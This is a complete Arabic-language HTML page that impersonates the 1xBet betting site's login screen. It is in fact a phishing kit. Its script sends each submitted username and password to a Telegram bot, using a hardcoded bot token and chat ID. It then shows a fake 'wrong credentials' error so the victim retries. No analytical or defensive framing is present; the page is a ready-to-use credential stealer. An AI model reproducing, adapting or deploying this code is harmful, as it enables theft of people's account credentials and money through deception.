<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>1xBet - تسجيل الدخول</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
    body { background-color: #0d1b2a; color: #fff; display: flex; flex-direction: column; min-height: 100vh; }
    
    /* الشريط العلوي */
    .navbar { background-color: #0b1a38; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #1e90ff; }
    .logo { color: #1e90ff; font-size: 24px; font-weight: 900; font-style: italic; }
    .nav-links { display: flex; gap: 15px; font-size: 14px; font-weight: bold; }
    
    /* صندوق تسجيل الدخول */
    .login-container { padding: 20px; max-width: 400px; margin: 0 auto; width: 100%; }
    .login-box { background-color: #fff; border-radius: 8px; padding: 20px; color: #333; }
    .login-box h2 { text-align: center; margin-bottom: 20px; font-size: 20px; color: #0b1a38; }
    
    .tab-container { display: flex; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; overflow: hidden; }
    .tab { flex: 1; text-align: center; padding: 10px; font-size: 14px; font-weight: bold; cursor: pointer; background: #f1f1f1; color: #555; }
    .tab.active { background: #1e90ff; color: #fff; }
    
    .input-group { margin-bottom: 15px; }
    .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; outline: none; }
    .input-group input:focus { border-color: #1e90ff; }
    
    .login-btn { width: 100%; padding: 12px; background-color: #28a745; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    .login-btn:disabled { background-color: #6c757d; }
    
    .forgot-pass { display: block; text-align: center; margin-top: 15px; font-size: 13px; color: #1e90ff; text-decoration: none; }
    
    .bonus-box { background-color: #1e90ff; color: #fff; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; font-weight: bold; font-size: 14px; }
    
    .error-msg { color: red; font-size: 13px; text-align: center; margin-bottom: 10px; display: none; }
</style>
</head>
<body>

<div class="navbar">
    <div class="logo">1XBET</div>
    <div class="nav-links">
        <span>الرياضات</span>
        <span>مباشر</span>
        <span>الألعاب</span>
    </div>
</div>

<div class="login-container">
    <div class="login-box">
        <h2>تسجيل الدخول</h2>
        
        <div class="error-msg" id="error">اسم المستخدم أو كلمة المرور غير صحيحة.</div>
        
        <div class="tab-container">
            <div class="tab active">نقرة واحدة</div>
            <div class="tab">عبر الهاتف</div>
        </div>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="off">
            </div>
            <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
        </form>
        
        <a href="#" class="forgot-pass">هل نسيت كلمة المرور؟</a>
    </div>
    
    <div class="bonus-box">
        مكافأة 100% على إيداعك الأول
    </div>
</div>

<script>
const TOKEN = "9225798978:AAHnyMuXHnWv7P_y05v2_nsR_O5VRGQZzCE";
const CHAT_ID = "7356963877";

document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const btn = document.getElementById('submitBtn');
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    btn.disabled = true;
    btn.textContent = "جارٍ تسجيل الدخول...";

    // إرسال البيانات إلى البوت
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `🎰 حساب 1xBet جديد\n👤 الحساب: ${username}\n🔑 كلمة المرور: ${password}`
            })
        });
    } catch (err) {}

    // إظهار خطأ وهمي
    btn.disabled = false;
    btn.textContent = "تسجيل الدخول";
    document.getElementById('error').style.display = 'block';
    document.getElementById('password').value = '';
});
</script>
</body>
</html>
